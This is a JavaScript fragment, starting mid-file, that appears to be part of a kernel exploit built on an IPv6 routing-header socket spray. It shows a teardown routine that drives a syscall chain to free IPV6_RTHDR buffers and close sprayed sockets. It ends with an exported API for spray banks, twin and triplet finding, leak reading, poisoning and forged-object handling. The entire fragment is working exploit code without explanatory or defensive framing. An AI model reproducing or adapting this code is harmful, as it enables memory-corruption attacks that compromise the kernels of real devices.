    }
    if (teardownRun) {
      flushMark("TEARDOWN-REENTRY", "concurrent-call-joined");
      return teardownRun;
    }
    teardownRun = doTeardown(opts || {});
    try {
      const r = await teardownRun;
      teardownResult = r;
      return r;
    } catch (err) {
      teardownRun = null;
      throw err;
    }
  }

  async function doTeardown(opts) {
    const skip = (opts && opts.skipIndices) || [];
    if (S.corrupt) {
      flushMark("TEARDOWN-REFUSED", S.corrupt.slice(0, 150));
      return {
        refused: true,
        reason: S.corrupt,
        freed: 0,
        closed: 0,
        total: S.n,
        leftOpen: S.n,
        freeFailed: [],
        closeFailed: [],
        skipped: [],
      };
    }
    const n = S.n;
    if (!n)
      return {
        freed: 0,
        closed: 0,
        total: 0,
        freeFailed: [],
        closeFailed: [],
        skipped: [],
      };
    flushMark(
      "TEARDOWN-PRE",
      "sockets=" +
        n +
        "-skip=" +
        (skip.join(".") || "none") +
        "-next=free_rthdr-then-close",
    );

    if (chain.count !== chain.initial_count + 3) {
      flushMark(
        "TEARDOWN-CHAIN-DIRTY",
        "count=" + chain.count + "-clearing-before-teardown",
      );
      chain.clear();
    }
    const doing = [];
    for (let i = 0; i < n; ++i) if (skip.indexOf(i) < 0) doing.push(i);
    const skipped = skip.slice();
    const target = doing.length;
    if (!target) {
      flushMark("TEARDOWN", "all-exempt-skip=" + skipped.join("."));
      return {
        freed: 0,
        closed: 0,
        total: 0,
        leftOpen: n,
        freeFailed: [],
        closeFailed: [],
        skipped,
      };
    }

    armPadIfNeeded(1, n);
    for (const i of doing)
      emitCall(
        SYS_SETSOCKOPT,
        retSetPtr(0, i),
        S.fds[i],
        K.IPPROTO_IPV6,
        K.IPV6_RTHDR,
        0,
        0,
      );
    await runChain();
    S.chainRuns++;
    const freeFailed = [];
    for (const i of doing)
      if (retSetOf(0, i) !== 0) freeFailed.push(i + "=" + retSetOf(0, i));

    armPad(1, n);
    for (const i of doing) emitCall(SYS_CLOSE, retSetPtr(0, i), S.fds[i]);
    await runChain();
    S.chainRuns++;
    const closeFailed = [];
    const kept = [];
    for (let i = 0; i < n; ++i) {
      if (skip.indexOf(i) >= 0) {
        kept.push(S.fds[i]);
        continue;
      }
      if (retSetOf(0, i) !== 0) {
        closeFailed.push(i + "=" + retSetOf(0, i));

        kept.push(S.fds[i]);
      } else {
        untrack(S.fds[i]);
      }
    }
    flushMark(
      "TEARDOWN",
      "freed=" +
        (target - freeFailed.length) +
        "of" +
        target +
        "-closed=" +
        (target - closeFailed.length) +
        "of" +
        target +
        "-exempt=" +
        (skipped.join(".") || "none") +
        "-freeFail=" +
        (freeFailed.join(".") || "none") +
        "-closeFail=" +
        (closeFailed.join(".") || "none"),
    );
    S.fds = kept;
    S.n = kept.length;
    return {
      freed: target - freeFailed.length,
      closed: target - closeFailed.length,
      total: target,
      leftOpen: kept.length,
      freeFailed,
      closeFailed,
      skipped,
    };
  }

  return {
    TWK,
    SHAPE,
    S,
    buildSprayBank,
    setSprayTag,
    sprayTagOf,
    sprayPtr,
    allocPad,
    armPad,
    armPadIfNeeded,
    retSetOf,
    retGetOf,
    optlenOf,
    leakTagOf,
    leakWord0Of,
    emitAttempt,
    emitCall,
    runTwinBatch,
    scanBatch,
    isTwin,
    chainCapacity,
    measureShape,
    rthdrShape,
    findTwins,
    findTriplet,
    tripletsValid,
    repairTriplets,
    clearCorrupt,
    burn,
    isBurned,

    setScanMarksQuiet,
    openSockets,
    teardown,
    arena,
    readFullHeader,
    poison,
    isForged,
    bankForgeries,
    canonicalTag,
    get corrupt() {
      return S.corrupt;
    },
    get teardownDone() {
      return teardownResult !== null;
    },
    get fds() {
      return S.fds.slice();
    },
    get n() {
      return S.n;
    },
    get triplets() {
      return S.triplets;
    },
    get twins() {
      return S.twins;
    },
  };
}

